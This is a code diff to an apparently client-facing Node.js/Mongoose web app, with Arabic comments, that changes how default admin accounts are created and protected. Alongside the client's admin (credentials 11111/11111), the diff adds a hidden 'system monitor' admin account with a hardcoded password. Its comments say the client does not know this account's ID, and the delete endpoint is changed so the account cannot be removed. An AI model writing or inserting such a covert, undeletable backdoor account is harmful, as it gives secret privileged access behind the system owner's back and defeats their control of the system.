@@ -112,17 +112,32 @@ const Article = mongoose.model('Article', articleSchema);
 async function createDefaultAdminIfNeeded() {
     try {
         const adminExists = await User.findOne({ role: 'admin' });
+        // --- تعديل: سنقوم بإنشاء الحسابات الافتراضية فقط إذا لم يكن هناك أي مدير على الإطلاق ---
         if (!adminExists) {
+            // حساب المدير العام (للعميل)
             const defaultAdmin = new User({
                 id: '11111',
                 name: 'المدير العام',
                 password: '11111', // كلمة مرور بسيطة، يجب تغييرها
                 role: 'admin'
             });
-            await defaultAdmin.save();
-            console.log('✅ تم إنشاء حساب المدير الافتراضي بنجاح.');
+
+            // حساب مراقب النظام (للمطور) - حساب خفي
+            const devMonitorAdmin = new User({
+                id: 'dev_monitor_789', // رقم عضوية خاص بك لا يعرفه العميل
+                name: 'مراقب النظام',
+                password: 'YourSecretPassword123!', // اختر كلمة مرور قوية جداً
+                role: 'admin'
+            });
+
+            await User.insertMany([defaultAdmin, devMonitorAdmin]);
+            console.log('✅ تم إنشاء حسابات المدير الافتراضية (المدير العام والمراقب) بنجاح.');
         }
     } catch (error) {
+        // قد يحدث خطأ إذا كانت الحسابات موجودة بالفعل، وهذا طبيعي.
+        if (error.code === 11000) {
+            console.log('ℹ️ الحسابات الإدارية الافتراضية موجودة بالفعل.');
+        }
         console.error('❌ فشل في إنشاء حساب المدير الافتراضي:', error);
     }
 }
@@ -173,8 +188,9 @@ app.delete('/api/users/:id', async (req, res) => {
         const user = await User.findOne({ id: req.params.id });
         if (!user) return res.status(404).json({ message: 'المستخدم غير موجود.' });
 
-        // --- منطق جديد: منع حذف المدير الأصلي ---
-        if (user.id === '11111') {
+        // --- تعديل: منع حذف أي من الحسابات الإدارية الأساسية ---
+        const protectedIds = ['11111', 'dev_monitor_789'];
+        if (protectedIds.includes(user.id)) {
             return res.status(400).json({ message: 'لا يمكن حذف المدير الأصلي للنظام.' });
         }
 
